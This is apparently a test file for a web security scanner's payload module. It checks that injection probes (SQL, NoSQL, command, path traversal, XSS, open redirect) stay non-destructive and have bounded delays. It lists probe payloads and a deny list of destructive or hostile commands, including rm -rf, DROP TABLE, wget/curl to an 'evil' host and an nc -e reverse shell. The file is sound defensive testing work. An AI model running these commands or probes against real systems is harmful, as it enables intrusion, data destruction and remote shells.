import { describe, it, expect } from 'vitest';
import {
  MAX_DELAY_SECONDS,
  PAYLOAD_CLASSES,
  PAYLOAD_TEMPLATES,
  buildPayloads,
  clampDelaySeconds,
  findForbiddenFragment,
  newCanary,
} from '../../src/dast/payloads';
import { redactHttp } from '../../src/dast/redact-http';
import type { InjectionClass } from '../../src/dast/payloads';

const CANARY = 'BS0a1b2c3d';

describe('payload policy (plan §0): no payload modifies or destroys state', () => {
  it.each([0, 1, 2])('no concrete payload contains a forbidden fragment (delay %i)', (delay) => {
    for (const cls of PAYLOAD_CLASSES) {
      for (const payload of buildPayloads(cls, CANARY, delay)) {
        expect(findForbiddenFragment(payload.text), `${cls}: ${payload.text}`).toBeUndefined();
      }
    }
  });

  it('no raw template contains a forbidden fragment either', () => {
    for (const payload of PAYLOAD_TEMPLATES) {
      expect(findForbiddenFragment(payload.template), payload.template).toBeUndefined();
    }
  });

  it.each([
    'DROP TABLE users',
    'delete from users',
    'x; TRUNCATE t',
    'UPDATE users SET a=1',
    'INSERT INTO t',
    'ALTER TABLE t',
    'CREATE TABLE t',
    'rm -rf /',
    'mkfs.ext4 /dev/sda',
    'echo x > /tmp/f',
    'echo x >> /tmp/f',
    'shutdown now',
    'reboot',
    'a; rm -rf x',
    '`cat x` rm',
    // Variantes que un filtro de "palabra + espacio literal" deja pasar.
    'x; DROP/**/TABLE users',
    'x;DROP%09TABLE users',
    'x%3Brm%20-rf%20%2F',
    'x%253Brm%2520-rf',
    'x;shutdown',
    ';reboot',
    '|rm -rf /',
    '$(rm -rf /)',
    '`id`',
    "1'; SELECT * INTO newtable FROM users",
    "' UNION SELECT 1 INTO OUTFILE '/tmp/x'",
    "'; EXEC xp_cmdshell 'dir'",
    'x; wget http://evil/x',
    'x; curl http://evil/x',
    'x | tee /tmp/f',
    'x; nc -e /bin/sh evil 1',
    'x; chmod 777 /etc',
    'x; mv a b',
    'x; kill -9 1',
    "'; REPLACE INTO t VALUES (1)",
    "'; GRANT ALL ON t TO u",
    "'; COPY t TO PROGRAM 'id'",
    'x %3E /tmp/f',
    'x\tINSERT\tINTO t',
  ])('flags %j', (text) => {
    expect(findForbiddenFragment(text)).toBeDefined();
  });

  it('no concrete payload is destructive in its URL-encoded forms either (once and twice encoded)', () => {
    for (const cls of PAYLOAD_CLASSES) {
      for (const payload of buildPayloads(cls, CANARY, 2)) {
        const once = encodeURIComponent(payload.text);
        expect(findForbiddenFragment(once), `${cls}: ${once}`).toBeUndefined();
        expect(findForbiddenFragment(encodeURIComponent(once)), `${cls}: ${once}`).toBeUndefined();
      }
    }
  });

  it('the catalog is exactly the reviewed allowlist: a new payload must be added here on purpose', () => {
    const REVIEWED = new Set([
      "'",
      "' OR '1'='1",
      "1' OR '1'='1'--",
      "1' AND SLEEP({{delay}})-- -",
      "1'; SELECT pg_sleep({{delay}})-- -",
      '{{canary}}',
      '',
      '; sleep {{delay}}',
      '| sleep {{delay}}',
      '$(sleep {{delay}})',
      '; echo {{canary}}',
      '$(echo {{canary}})',
      '../../../../etc/passwd',
      '..\\..\\..\\..\\windows\\win.ini',
      '....//....//etc/passwd',
      '"<img src=x onerror=alert({{canary}})',
      "'\"<i{{canary}}",
      'https://bs-{{canary}}.example.net',
      '//bs-{{canary}}.example.net',
    ]);
    expect(PAYLOAD_TEMPLATES.map((p) => p.template).filter((t) => !REVIEWED.has(t))).toEqual([]);
    expect(PAYLOAD_TEMPLATES).toHaveLength(REVIEWED.size);
  });

  it('every command in a command-injection payload is a bounded sleep or an echo of the canary', () => {
    for (const payload of PAYLOAD_TEMPLATES.filter((p) => p.class === 'cmdi')) {
      expect(payload.template).toMatch(/^(?:; |\| |\$\()(?:sleep \{\{delay\}\}|echo \{\{canary\}\})\)?$/);
    }
  });

  it('every time-based payload takes its duration only from the {{delay}} placeholder', () => {
    for (const payload of PAYLOAD_TEMPLATES.filter((p) => p.timing === true)) {
      expect(payload.template).toMatch(/(?:sleep|SLEEP)[( ]\{\{delay\}\}/);
    }
  });

  it('allows reads, always-true conditions, bounded delays and canaries', () => {
    expect(findForbiddenFragment("' OR '1'='1")).toBeUndefined();
    expect(findForbiddenFragment('; sleep 2')).toBeUndefined();
    expect(findForbiddenFragment('../../../../etc/passwd')).toBeUndefined();
    expect(findForbiddenFragment('[$ne]')).toBeUndefined();
  });
});

describe('buildPayloads', () => {
  it('substitutes the canary and the delay', () => {
    const sqli = buildPayloads('sqli', CANARY, 2).find((p) => p.oracle === 'timing');
    expect(sqli?.text).toBe("1' AND SLEEP(2)-- -");
    expect(buildPayloads('cmdi', CANARY, 1).map((p) => p.text)).toContain('; sleep 1');
    expect(buildPayloads('xss', CANARY, 0).every((p) => p.text.includes(CANARY))).toBe(true);
    expect(buildPayloads('xss', CANARY, 0).every((p) => p.canary === CANARY)).toBe(true);
  });

  it('leaves no placeholder behind', () => {
    for (const cls of PAYLOAD_CLASSES) {
      for (const payload of buildPayloads(cls, CANARY, 2)) {
        expect(payload.text).not.toMatch(/\{\{|\}\}/);
      }
    }
  });

  it('produces at least one payload for every class', () => {
    for (const cls of PAYLOAD_CLASSES) {
      expect(buildPayloads(cls, CANARY, 2).length, cls).toBeGreaterThan(0);
    }
  });

  it('keeps the NoSQL bracket on the nosqli payloads', () => {
    const brackets = buildPayloads('nosqli', CANARY, 2).map((p) => p.bracket);
    expect(brackets).toEqual(['[$ne]', '[$gt]']);
  });

  it('caps every delay at 2 seconds, however high the requested value is', () => {
    expect(MAX_DELAY_SECONDS).toBe(2);
    expect(clampDelaySeconds(999)).toBe(2);
    expect(clampDelaySeconds(Number.POSITIVE_INFINITY)).toBe(2);
    expect(clampDelaySeconds(Number.NaN)).toBe(2);
    expect(clampDelaySeconds(undefined)).toBe(2);
    expect(clampDelaySeconds(0)).toBe(1);
    expect(clampDelaySeconds(-5)).toBe(1);
    expect(clampDelaySeconds(1.9)).toBe(1);
    for (const requested of [3, 10, 999]) {
      expect(() => buildPayloads('cmdi', CANARY, requested)).toThrow(RangeError);
    }
  });

  it('keeps the canary and the payload text intact when the evidence is redacted', () => {
    for (const cls of PAYLOAD_CLASSES) {
      for (const payload of buildPayloads(cls, CANARY, 2)) {
        const line = `# payload (reflection): ${payload.text}`;
        expect(redactHttp(line)).toBe(line);
      }
    }
  });

  it('rejects a delay above 2 seconds or a malformed canary', () => {
    expect(() => buildPayloads('sqli', CANARY, 3)).toThrow(RangeError);
    expect(() => buildPayloads('sqli', CANARY, -1)).toThrow(RangeError);
    expect(() => buildPayloads('sqli', 'BSZZZZZZZZ', 2)).toThrow(RangeError);
  });

  it('exposes the class list in a fixed order', () => {
    const expected: InjectionClass[] = ['sqli', 'nosqli', 'cmdi', 'path-traversal', 'xss', 'open-redirect'];
    expect(PAYLOAD_CLASSES).toEqual(expected);
  });
});

describe('newCanary', () => {
  it('has the form BS<8 hex>', () => {
    expect(newCanary()).toMatch(/^BS[0-9a-f]{8}$/);
  });

  it('is unique between two calls', () => {
    const seen = new Set(Array.from({ length: 200 }, () => newCanary()));
    expect(seen.size).toBe(200);
  });
});
